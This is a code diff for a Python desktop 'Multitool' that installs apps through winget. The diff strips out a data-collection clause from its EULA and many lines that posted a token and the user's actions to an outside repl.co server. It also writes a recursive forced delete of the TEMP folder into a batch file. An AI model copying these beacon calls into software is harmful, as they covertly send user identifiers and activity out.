@@ -111,27 +111,19 @@ class App(customtkinter.CTk):
            This EULA is effective until terminated. You may terminate the EULA at any time by uninstalling the "Multitool" software.
            Luca may terminate the EULA if you fail to comply with any of the terms and conditions of this EULA. Upon termination,
            you must destroy all copies of the "Multitool" software.
-        5. Data Collection.
-           The "Multitool" software may collect anonymous usage data for the purpose of improving the app and providing personalized recommendations.
-           This data will not be be shared with third-party services.
-           The "Multitool" software will not access/send any personal files.
+        
         """
         self.textbox.insert("0.0", "Terms and Conditions:\n\n" + mesag * 1)
 
         
 
-        msg = token + " Succesfuly booted into the system"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
-    def console(self):
-        msg = input()
-        amsg = user + " with the token: " + token + " sended a feedback. " + msg
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': amsg})
+        
+    
+        
     def setvar(self):
         global value
         value = self.optionmenu_1.get()
         print(f"Value is now set to {value}")
-        msg = token + f" is installing {value}"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         if value == "Chrome":
             cmd = "winget install Google.chrome"
             with open("temp.bat", "w") as f:
@@ -164,8 +156,6 @@ class App(customtkinter.CTk):
         global value
         value = self.optionmenu_2.get()
         print(f"Value is now set to {value}")
-        msg = token + f" is installing {value}"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         if value == "7-Zip":
             cmd = "winget install 7zip.7zip"
             with open("temp.bat", "w") as f:
@@ -191,8 +181,6 @@ class App(customtkinter.CTk):
         global value
         value = self.optionmenu_3.get()
         print(f"Value is now set to {value}")
-        msg = token + f" is installing {value}"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         if value == "Zoom":
             cmd = "winget install Zoom.Zoom"
             with open("temp.bat", "w") as f:
@@ -239,8 +227,6 @@ class App(customtkinter.CTk):
         global value
         value = self.optionmenu_4.get()
         print(f"Value is now set to {value}")
-        msg = token + f" is installing {value}"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         if value == "Spotify":
             cmd = "winget install Spotify.Spotify"
             with open("temp.bat", "w") as f:
@@ -287,8 +273,6 @@ class App(customtkinter.CTk):
         global value
         value = self.optionmenu_5.get()
         print(f"Value is now set to {value}")
-        msg = token + f" is installing {value}"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         if value == "Krita":
             cmd = "winget install KDE.Krita"
             with open("temp.bat", "w") as f:
@@ -356,8 +340,6 @@ class App(customtkinter.CTk):
         global value
         value = self.optionmenu_6.get()
         print(f"Value is now set to {value}")
-        msg = token + f" is installing {value}"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         if value == "Python x64 3":
             cmd = "winget install Python.Python.3.11"
             with open("temp.bat", "w") as f:
@@ -422,8 +404,6 @@ class App(customtkinter.CTk):
         global value
         value = self.optionmenu_7.get()
         print(f"Value is now set to {value}")
-        msg = token + f" is installing {value}"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         if value == "TeamViewer 15":
             cmd = "winget install TeamViewer.TeamViewer"
             with open("temp.bat", "w") as f:
@@ -498,8 +478,6 @@ class App(customtkinter.CTk):
         global value
         value = self.optionmenu_8.get()
         print(f"Value is now set to {value}")
-        msg = token + f" is installing {value}"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         if value == "Foxit Reader":
             cmd = "winget install Foxitreader"
             with open("temp.bat", "w") as f:
@@ -638,8 +616,6 @@ class App(customtkinter.CTk):
         os.remove("temp.bat")
         return
     def dtemporary(self):
-        msg = token + " is deleteing their unecesary files"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         cmd = "del /q/f/s %TEMP%\*"
         with open("temp.bat","w") as f:
             f.write(cmd)
@@ -648,8 +624,6 @@ class App(customtkinter.CTk):
         os.remove("temp.bat")
         return
     def updateapps(self):
-        msg = token + " is updating their apps"
-        response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': msg})
         cmd = "winget upgrade --all"
         with open("temp.bat", "w") as f:
             f.write(cmd)
